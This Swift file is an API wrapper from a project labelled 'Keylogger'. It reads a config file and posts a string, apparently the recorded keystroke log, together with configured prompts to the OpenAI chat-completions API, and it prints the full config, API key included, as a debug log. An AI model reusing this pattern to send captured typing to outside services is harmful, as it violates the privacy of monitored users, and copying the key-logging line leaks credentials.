//
//  ApiWrapper.swift
//  Keylogger
//
//  Created by Vladimir on 23.07.24.
//  Copyright © 2024 Skrew Everything. All rights reserved.
//

import Foundation

struct Prompt: Decodable {
    let role: String
    var content: String
}

struct Config: Decodable {
    let model: String
    let prompts: [Prompt]
    let inactivityInterval: Int
    let apiKey: String
}

class ApiWrapper {
    let apiURL = "https://api.openai.com/v1/chat/completions"
    var config: Config?
    
    init() {
        self.loadConfig()
    }
    
    func loadConfig() {
            // Determine the path of the executable
            let executableURL = URL(fileURLWithPath: CommandLine.arguments[0])
            let executableDirectory = executableURL.deletingLastPathComponent()
            let fileURL = executableDirectory.appendingPathComponent("config.json")
            
            do {
                let jsonData = try Data(contentsOf: fileURL)
                self.config = try JSONDecoder().decode(Config.self, from: jsonData)
                print("Config loaded successfully: \(self.config!)") // Debug log
            } catch {
                print("Error loading config: \(error)")
            }
        }
    
    func sendFileContent(fileContent: String, completion: @escaping (Result<String, Error>) -> Void) {
        guard let config = config else {
                    completion(.failure(NSError(domain: "Config not loaded", code: 0, userInfo: nil)))
                    return
                }
        
        guard let url = URL(string: apiURL) else {
            completion(.failure(NSError(domain: "Invalid URL", code: 0, userInfo: nil)))
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("Bearer \(config.apiKey)", forHTTPHeaderField: "Authorization")
        
        var messages = config.prompts
                if let userPromptIndex = messages.firstIndex(where: { $0.role == "user" }) {
                    messages[userPromptIndex].content += fileContent
                }
                
                let requestBody: [String: Any] = [
                    "model": config.model,
                    "messages": messages.map { ["role": $0.role, "content": $0.content] }
                ]
                
//        if let requestBodyData = try? JSONSerialization.data(withJSONObject: requestBody, options: .prettyPrinted),
//                   let requestBodyString = String(data: requestBodyData, encoding: .utf8) {
////                    print("Request Body: \(requestBodyString)")
//                }
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: requestBody, options: [])
        } catch {
            completion(.failure(error))
            return
        }
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                completion(.failure(error))
                return
            }
            
            guard let data = data else {
                completion(.failure(NSError(domain: "No data received", code: 0, userInfo: nil)))
                return
            }
            
            do {
                if let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
                   let choices = jsonResponse["choices"] as? [[String: Any]],
                   let message = choices.first?["message"] as? [String: Any],
                   let text = message["content"] as? String {
                    completion(.success(text))
                } else {
                    completion(.failure(NSError(domain: "Invalid response format", code: 0, userInfo: nil)))
                }
            } catch {
                completion(.failure(error))
            }
        }
        
        task.resume()
    }
}
